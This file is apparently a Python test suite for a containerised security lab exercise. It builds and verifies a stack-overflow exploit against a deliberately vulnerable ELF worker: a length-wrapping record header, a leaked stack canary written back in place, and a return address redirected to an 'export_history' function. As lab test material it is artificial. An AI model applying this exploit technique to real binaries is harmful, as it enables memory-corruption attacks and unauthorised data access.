#!/usr/bin/env python3
from __future__ import annotations

import base64
import hashlib
import json
import struct
import subprocess
import time
import unittest
import test_w28_live as w28

PROCESS = w28.PROCESS
request = w28.request


def crc32c(data: bytes) -> int:
    value = 0xFFFFFFFF
    for octet in data:
        value ^= octet
        for _ in range(8):
            value = (value >> 1) ^ (0x82F63B78 if value & 1 else 0)
    return value ^ 0xFFFFFFFF


def dvl1(payload: bytes, declared: int = 0xFE08, header: int = 0x01F8) -> bytes:
    assert len(payload) == 500
    return b"DVL1" + struct.pack("<HHI", declared, header, crc32c(payload)) + payload


def elf_symbol(binary: bytes, name: str) -> int:
    section_offset = struct.unpack_from("<Q", binary, 0x28)[0]
    section_size = struct.unpack_from("<H", binary, 0x3A)[0]
    section_count = struct.unpack_from("<H", binary, 0x3C)[0]
    sections = [struct.unpack_from("<IIQQQQIIQQ", binary, section_offset + index * section_size)
                for index in range(section_count)]
    for section in sections:
        if section[1] not in (2, 11):
            continue
        strings = sections[section[6]]
        string_table = binary[strings[4]:strings[4] + strings[5]]
        for offset in range(section[4], section[4] + section[5], section[9]):
            name_offset, _, _, _, value, _ = struct.unpack_from("<IBBHQQ", binary, offset)
            end = string_table.find(b"\0", name_offset)
            if string_table[name_offset:end].decode(errors="replace") == name:
                return value
    raise AssertionError(f"ELF symbol {name} not found")


def elf_string_vaddr(binary: bytes, needle: bytes) -> int:
    file_offset = binary.index(needle)
    program_offset = struct.unpack_from("<Q", binary, 0x20)[0]
    program_size = struct.unpack_from("<H", binary, 0x36)[0]
    program_count = struct.unpack_from("<H", binary, 0x38)[0]
    for index in range(program_count):
        header = struct.unpack_from("<IIQQQQQQ", binary, program_offset + index * program_size)
        if header[0] == 1 and header[2] <= file_offset < header[2] + header[5]:
            return header[3] + file_offset - header[2]
    raise AssertionError("history identifier is not in a loadable segment")


def elf_posture(binary: bytes) -> tuple[bool, bool, bool]:
    pie = struct.unpack_from("<H", binary, 0x10)[0] == 3
    program_offset = struct.unpack_from("<Q", binary, 0x20)[0]
    program_size = struct.unpack_from("<H", binary, 0x36)[0]
    program_count = struct.unpack_from("<H", binary, 0x38)[0]
    nx = relro = bind_now = False
    for index in range(program_count):
        header = struct.unpack_from("<IIQQQQQQ", binary, program_offset + index * program_size)
        if header[0] == 0x6474E551:
            nx = not bool(header[1] & 1)
        elif header[0] == 0x6474E552:
            relro = True
        elif header[0] == 2:
            for offset in range(header[2], header[2] + header[5], 16):
                tag, value = struct.unpack_from("<QQ", binary, offset)
                if tag == 0: break
                if tag == 24 or (tag == 30 and value & 8) or (tag == 0x6FFFFFFB and value & 1):
                    bind_now = True
    return pie, nx, relro and bind_now


class W31Live(unittest.TestCase):
    process_session = ""
    contract: dict = {}
    worker = b""
    execution: dict = {}

    @classmethod
    def setUpClass(cls) -> None:
        w28.W28Live.setUpClass()
        cls.process_session = w28.W28Live.process_session

    def process(self, path: str, *, method: str = "POST", body: dict | None = None,
                token: str | None = None, tenant: str = "arwc") -> tuple[int, dict]:
        return request(PROCESS, path, method=method, body=body,
                       token=type(self).process_session if token is None else token, tenant=tenant)

    def test_01_exact_vault_contract_and_real_hardened_worker(self) -> None:
        status, denied = self.process("/api/the-vault-s-misleading-length", method="GET", token="wrong")
        self.assertEqual(status, 403); self.assertNotIn("worker_b64", denied)
        status, denied = self.process("/api/the-vault-s-misleading-length", method="GET", tenant="other")
        self.assertEqual(status, 403); self.assertNotIn("worker_b64", denied)
        status, result = self.process("/api/the-vault-s-misleading-length", method="GET")
        self.assertEqual(status, 200, result)
        record = result["record"]; worker = base64.b64decode(result["worker_b64"], validate=True)
        self.assertEqual(record["record_id"], "VAULT-CRR-R5")
        self.assertEqual(record["case_id"], "DV-CRR-4417")
        self.assertEqual(record["protected_history_reference"], "HIST-APR-CRR-09")
        self.assertEqual(record["request_limit"], 512); self.assertEqual(record["integrity"], "CRC32C")
        self.assertEqual(worker[:4], b"\x7fELF"); self.assertEqual(hashlib.sha256(worker).hexdigest(), record["worker"]["sha256"])
        deployed = subprocess.check_output(["docker", "exec", "--user", "arwc-diagnostics",
                                            "cinder-arwc-diagnostics", "cat",
                                            "/opt/diagnostic-services/artifacts/dvl-worker-r5"])
        self.assertEqual(worker, deployed)
        type(self).contract = record; type(self).worker = worker
        self.assertEqual(elf_posture(worker), (True, True, True))
        self.assertIn(b"__stack_chk_fail", worker); self.assertGreater(elf_symbol(worker, "export_history"), 0)

    def test_02_wrapped_length_reaches_the_protected_boundary(self) -> None:
        payload = b"B" * 500; record = dvl1(payload)
        body = {"case_id": "DV-CRR-4417", "build_id": "DVL-WORKER-R5",
                "record_b64": base64.b64encode(record).decode()}
        wrong_crc = bytearray(record); wrong_crc[8] ^= 1
        status, _ = self.process("/api/past-the-parser-s-boundary", body={**body, "record_b64": base64.b64encode(wrong_crc).decode()})
        self.assertEqual(status, 409)
        zero = dvl1(payload, declared=0, header=0x01F8)
        status, _ = self.process("/api/past-the-parser-s-boundary", body={**body, "record_b64": base64.b64encode(zero).decode()})
        self.assertEqual(status, 409)
        status, _ = self.process("/api/past-the-parser-s-boundary", body={**body, "record_b64": base64.b64encode(record + b"X").decode()})
        self.assertEqual(status, 409)
        status, result = self.process("/api/past-the-parser-s-boundary", body=body)
        self.assertEqual(status, 201, result)
        self.assertEqual(result["record"]["wrapped_sum"], 0)
        self.assertEqual(result["record"]["copied_bytes"], 504)
        self.assertEqual(result["record"]["workspace_bytes"], 0x120)
        self.assertTrue(result["record"]["worker_exited_normally"])

    def exploit_record(self, *, canary_delta: int = 0, return_delta: int = 0) -> bytes:
        contract = type(self).contract; worker = type(self).worker
        status = contract["status"]; layout = contract["frame"]
        base = int(status["status_address"], 16) - status["status_offset"]
        export = base + elf_symbol(worker, "export_history") + return_delta
        history = base + elf_string_vaddr(worker, b"HIST-APR-CRR-09\0")
        payload = bytearray(b"A" * 500)
        struct.pack_into("<Q", payload, layout["canary_offset"], int(status["stack_canary"], 16) ^ canary_delta)
        struct.pack_into("<Q", payload, layout["saved_rbp_offset"], base + 0x18000)
        struct.pack_into("<Q", payload, layout["return_state_offset"], export)
        struct.pack_into("<Q", payload, layout["argument_offset"], history)
        return dvl1(payload)

    def test_03_preserved_canary_and_build_bound_return_control(self) -> None:
        common = {"case_id": "DV-CRR-4417", "build_id": "DVL-WORKER-R5"}
        status, _ = self.process("/api/the-state-execution-returns-to", body={
            **common, "record_b64": base64.b64encode(self.exploit_record(canary_delta=1)).decode()})
        self.assertEqual(status, 409)
        status, _ = self.process("/api/the-state-execution-returns-to", body={
            **common, "record_b64": base64.b64encode(self.exploit_record(return_delta=1)).decode()})
        self.assertEqual(status, 409)
        status, _ = self.process("/api/the-state-execution-returns-to", body={
            "case_id": "DV-CRR-4417", "build_id": "DVL-WORKER-R4",
            "record_b64": base64.b64encode(self.exploit_record()).decode()})
        self.assertEqual(status, 409)
        status, result = self.process("/api/the-state-execution-returns-to", body={
            **common, "record_b64": base64.b64encode(self.exploit_record()).decode()})
        self.assertEqual(status, 201, result)
        self.assertEqual(result["audit_id"], result["record"]["correlation"])
        self.assertTrue(result["record"]["canary_preserved"])
        self.assertTrue(result["record"]["worker_exited_normally"])
        self.assertEqual(result["record"]["principal"], "svc-diagnostic-vault")
        self.assertNotIn("history", result)
        type(self).execution = result["record"]

    def test_04_service_authority_exports_only_the_bound_history(self) -> None:
        execution = type(self).execution
        body = {key: execution[key] for key in ("execution_id", "correlation", "history_id", "history_digest")}
        status, _ = self.process("/api/the-diagnostic-service-s-authority", body={**body, "history_id": "HIST-APR-CRR-10"})
        self.assertEqual(status, 409)
        status, _ = self.process("/api/the-diagnostic-service-s-authority", body={**body, "correlation": "00000000-0000-4000-8000-000000000000"})
        self.assertEqual(status, 409)
        approval_before = subprocess.check_output(["docker", "exec", "--user", "arwc-approval",
            "cinder-arwc-approval", "cat", "/var/lib/arwc-approval/state/maintenance-review.json"])
        broker_before = subprocess.check_output(["docker", "exec", "--user", "arwc-control-broker",
            "cinder-arwc-control-broker", "cat", "/var/lib/arwc-control-broker/state/control-broker.json"])
        status, result = self.process("/api/the-diagnostic-service-s-authority", body=body)
        self.assertEqual(status, 201, result)
        self.assertEqual(result["history"]["record_id"], "HIST-APR-CRR-09")
        self.assertFalse(result["record"]["current_approval"]); self.assertFalse(result["record"]["control_authority"])
        self.assertEqual(hashlib.sha256(json.dumps(result["history"], sort_keys=True, separators=(",", ":")).encode()).hexdigest(),
                         result["record"]["history_digest"])
        status, repeated = self.process("/api/the-diagnostic-service-s-authority", body=body)
        self.assertEqual(status, 201); self.assertEqual(result, repeated)
        self.assertEqual(approval_before, subprocess.check_output(["docker", "exec", "--user", "arwc-approval",
            "cinder-arwc-approval", "cat", "/var/lib/arwc-approval/state/maintenance-review.json"]))
        self.assertEqual(broker_before, subprocess.check_output(["docker", "exec", "--user", "arwc-control-broker",
            "cinder-arwc-control-broker", "cat", "/var/lib/arwc-control-broker/state/control-broker.json"]))

    def test_05_owned_result_and_audit_persist_across_restart(self) -> None:
        before = json.loads(subprocess.check_output(["docker", "exec", "--user", "arwc-diagnostics",
            "cinder-arwc-diagnostics", "cat", "/var/lib/arwc-diagnostics/state/service.json"], text=True))
        self.assertTrue(before["vault_contract_observed"]); self.assertTrue(before["vault_boundary_controlled"])
        self.assertTrue(before["vault_saved_state_controlled"]); self.assertIsNotNone(before["vault_history_response"])
        self.assertEqual(subprocess.check_output(["docker", "inspect", "-f",
            '{{(index .NetworkSettings.Networks "cinder-arwc-engineering").IPAddress}}',
            "cinder-arwc-diagnostics"], text=True).strip(), "10.77.63.50")
        self.assertEqual(subprocess.check_output(["docker", "inspect", "-f",
            '{{range $port, $bindings := .NetworkSettings.Ports}}{{if $bindings}}{{$port}}{{end}}{{end}}',
            "cinder-arwc-diagnostics"], text=True).strip(), "")
        self.assertEqual(subprocess.check_output(["docker", "inspect", "-f", '{{.HostConfig.ReadonlyRootfs}}',
            "cinder-arwc-diagnostics"], text=True).strip(), "true")
        self.assertEqual(subprocess.check_output(["docker", "inspect", "-f", '{{json .HostConfig.CapDrop}}',
            "cinder-arwc-diagnostics"], text=True).strip(), '["ALL"]')
        self.assertIn("no-new-privileges:true", subprocess.check_output(["docker", "inspect", "-f",
            '{{json .HostConfig.SecurityOpt}}', "cinder-arwc-diagnostics"], text=True))
        direct = w28.inside("python3", "-c", "import socket; socket.create_connection(('10.77.63.50',443),1)")
        self.assertNotEqual(direct.returncode, 0)
        subprocess.run(["docker", "stop", "cinder-arwc-diagnostics"], stdout=subprocess.DEVNULL, check=True)
        execution = type(self).execution
        body = {key: execution[key] for key in ("execution_id", "correlation", "history_id", "history_digest")}
        status, _ = self.process("/api/the-diagnostic-service-s-authority", body=body)
        self.assertEqual(status, 409)
        subprocess.run(["docker", "start", "cinder-arwc-diagnostics"], stdout=subprocess.DEVNULL, check=True)
        for _ in range(80):
            try:
                status, _ = self.process("/api/the-vault-s-misleading-length", method="GET")
                if status == 200: break
            except AssertionError: pass
            time.sleep(0.25)
        else: self.fail("diagnostic service did not return after restart")
        after = json.loads(subprocess.check_output(["docker", "exec", "--user", "arwc-diagnostics",
            "cinder-arwc-diagnostics", "cat", "/var/lib/arwc-diagnostics/state/service.json"], text=True))
        self.assertTrue(after["vault_saved_state_controlled"]); self.assertEqual(after["vault_history_response"], before["vault_history_response"])
        audit = subprocess.check_output(["docker", "exec", "--user", "arwc-diagnostics",
            "cinder-arwc-diagnostics", "cat", "/var/lib/arwc-diagnostics/audit/events.jsonl"], text=True)
        self.assertIn("the-state-execution-returns-to", audit); self.assertIn("the-diagnostic-service-s-authority", audit)
        artifact = json.loads(subprocess.check_output(["docker", "exec", "--user", "arwc-diagnostics",
            "cinder-arwc-diagnostics", "cat", "/var/lib/arwc-diagnostics/artifacts/the-diagnostic-service-s-authority/result.json"], text=True))
        self.assertEqual(artifact["record_id"], "HIST-APR-CRR-09")


if __name__ == "__main__":
    unittest.main(verbosity=2)
